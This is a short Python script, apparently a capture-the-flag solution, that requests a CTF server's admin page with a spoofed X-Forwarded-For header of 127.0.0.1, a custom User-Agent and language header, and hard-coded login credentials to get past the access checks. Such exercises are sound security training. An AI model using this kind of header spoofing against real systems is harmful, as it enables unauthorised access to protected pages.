import requests
pw='bocchio'
r = requests.get('http://ctf.adl.tw:12002/admin',
                         headers={"X-Forwarded-For": "127.0.0.1",
                                  "User-Agent": "STARRYBrowser",
                                  "Accept-Language": "ja-JP"}, auth=("bocchi", pw))
#you can use a debugger to checkout the request.text
pass
